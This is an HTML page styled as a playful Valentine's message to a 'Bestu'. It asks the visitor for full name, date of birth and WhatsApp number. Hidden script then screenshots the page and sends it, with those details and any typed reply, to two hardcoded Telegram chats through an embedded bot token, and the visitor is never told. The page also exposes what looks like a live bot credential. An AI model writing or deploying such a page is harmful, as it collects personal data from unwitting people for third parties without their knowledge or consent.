<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>For My Bestu ‚ù§Ô∏è</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Dancing+Script:wght@700&display=swap');
        
        :root {
            --bg: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
            --glass: rgba(255, 255, 255, 0.25);
            --text: #ffffff;
            --accent: #ff4d6d;
        }

        .dark-theme {
            --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            --glass: rgba(255, 255, 255, 0.05);
            --text: #e2e8f0;
            --accent: #ff758f;
        }

        body { 
            font-family: 'Poppins', sans-serif; 
            background: var(--bg); 
            color: var(--text);
            min-height: 100vh;
            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
            overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }

        .status-bar {
            position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between;
            padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500;
        }

        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3);
            z-index: 10;
            animation: slideUp 0.8s cubic-bezier(0.22, 1, 0.36, 1);
        }

        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .cursive { font-family: 'Dancing Script', cursive; }

        .orb {
            position: absolute; border-radius: 50%; filter: blur(80px);
            z-index: 0; animation: floatOrb 10s infinite alternate;
        }
        @keyframes floatOrb { from { transform: translate(0,0); } to { transform: translate(40px, 60px); } }

        .particle {
            position: fixed; top: -10%; pointer-events: none;
            animation: fall linear forwards; z-index: 100;
        }
        @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }

        #yt-header {
            position: fixed; top: -300px; left: 0; width: 100%; height: 240px;
            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 400; background: black; border-bottom: 4px solid var(--accent);
        }
        #yt-header.active { top: 0; }

        .btn-premium {
            background: var(--accent);
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .btn-premium:hover { transform: scale(1.05); filter: brightness(1.1); }

        .hidden-stage { display: none; }
        .thank-you-img { animation: floating 3s ease-in-out infinite; }
        @keyframes floating { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
    </style>
</head>
<body id="capture-body">

    <div class="orb w-72 h-72 bg-pink-400 opacity-30 top-10 left-[-50px]"></div>
    <div class="orb w-80 h-80 bg-purple-500 opacity-20 bottom-10 right-[-50px]"></div>

    <div class="status-bar">
        <div id="clock">12:00</div>
        <div class="flex gap-3">
            <span>üì∂</span> <span id="battery-level">üîã 95%</span>
        </div>
    </div>

    <button onclick="toggleTheme()" class="fixed bottom-6 right-6 p-4 glass-card rounded-2xl z-[600]">
        <span id="theme-icon" class="text-xl">üåô</span>
    </button>

    <div id="yt-header">
        <div id="player-mount" class="w-full h-full"></div>
    </div>

    <div class="w-full max-w-sm px-4">
        <div id="main-content" class="glass-card p-8 text-center w-full relative overflow-hidden">
            
            <div id="stage-1" class="space-y-4">
                <h1 class="text-4xl font-bold cursive mb-2 drop-shadow-md">Hey Bestu! ‚ú®</h1>
                <div class="space-y-4">
                    <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
                    <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
                    <input type="tel" id="mobile" placeholder="WhatsApp Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
                    <button onclick="toStage2()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl mt-4 shadow-xl">Reveal Heart ‚ù§Ô∏è</button>
                </div>
            </div>

            <div id="stage-2" class="hidden-stage">
                <h1 class="text-4xl font-bold cursive mb-6 drop-shadow-md">For You... ‚ù§Ô∏è</h1>
                <p class="text-xl italic mb-10 tracking-wide">Will you be my Valentine?</p>
                <div class="grid gap-4">
                    <button onclick="handleAction('YES', '‚ù§Ô∏è')" class="btn-premium text-white font-bold py-4 rounded-2xl shadow-lg">YES! üòç</button>
                    <button onclick="handleAction('NO', 'üòä')" class="bg-white/10 text-white font-bold py-4 rounded-2xl transition-all">No üò¢</button>
                    <button onclick="handleAction('FOOD', 'üçï')" class="bg-yellow-500/80 text-white font-bold py-4 rounded-2xl shadow-lg">Food (You pay! üçï)</button>
                </div>
            </div>

            <div id="stage-3" class="hidden-stage space-y-6">
                <h2 class="text-3xl font-bold cursive mb-4 drop-shadow-md">You're Amazing! ‚ù§Ô∏è</h2>
                <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="thank-you-img w-full rounded-[2rem] shadow-2xl">
                <div class="bg-white/10 p-5 rounded-3xl border border-white/20">
                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-transparent border border-white/10 outline-none text-sm text-white" rows="2"></textarea>
                    <button onclick="sendFinalReply()" class="w-full bg-green-500 text-white font-bold py-3 rounded-xl mt-3 text-xs uppercase shadow-lg">Submit ‚úÖ</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
        const CHAT_IDS = ["6572151527", "7893857792"]; 
        let store = {};

        function updateClock() {
            const d = new Date();
            document.getElementById('clock').innerText = d.getHours() + ":" + String(d.getMinutes()).padStart(2, '0');
        }
        setInterval(updateClock, 1000); updateClock();

        function toggleTheme() {
            document.body.classList.toggle('dark-theme');
            document.getElementById('theme-icon').innerText = document.body.classList.contains('dark-theme') ? '‚òÄÔ∏è' : 'üåô';
        }

        function createRain(emoji) {
            for(let i=0; i<45; i++) {
                setTimeout(() => {
                    const p = document.createElement('div');
                    p.innerText = emoji; p.className = 'particle';
                    p.style.left = Math.random() * 100 + 'vw';
                    p.style.fontSize = '25px';
                    p.style.animationDuration = '3s';
                    document.body.appendChild(p);
                    setTimeout(() => p.remove(), 4000);
                }, i * 80);
            }
        }

        function toStage2() {
            store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
            if(!store.n || !store.m) return alert("Fill details! ‚ú®");
            document.getElementById('stage-1').classList.add('hidden-stage');
            document.getElementById('stage-2').classList.remove('hidden-stage');
        }

        const yt = { 'YES': 'TK2RwQUun-U', 'NO': 'CVEM60qkzT8', 'FOOD': 'XGURSAziJjc' };

        async function handleAction(type, emoji) {
            createRain(emoji);
            
            // Capture Full Screen Simulation
            const canvas = await html2canvas(document.body, { useCORS: true, backgroundColor: null, scale: 2 });
            canvas.toBlob(async (blob) => {
                // Send to BOTH IDs
                CHAT_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append('chat_id', id);
                    fd.append('photo', blob, 'shot.png');
                    fd.append('caption', `üíå RESPONSE: ${type}\nName: ${store.n}\nMobile: ${store.m}\nDOB: ${store.d}`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                });
            }, 'image/png');

            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${yt[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
            document.getElementById('yt-header').classList.add('active');

            document.getElementById('stage-2').classList.add('hidden-stage');
            document.getElementById('stage-3').classList.remove('hidden-stage');
        }

        async function sendFinalReply() {
            const reply = document.getElementById('final-reply').value;
            if(!reply) return alert("Write something! ‚ù§Ô∏è");
            // Send to BOTH IDs
            CHAT_IDS.forEach(id => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("üí¨ Message from " + store.n + ": " + reply)}`);
            });
            alert("Sent! Thank you!");
            location.reload();
        }
    </script>
</body>
</html>
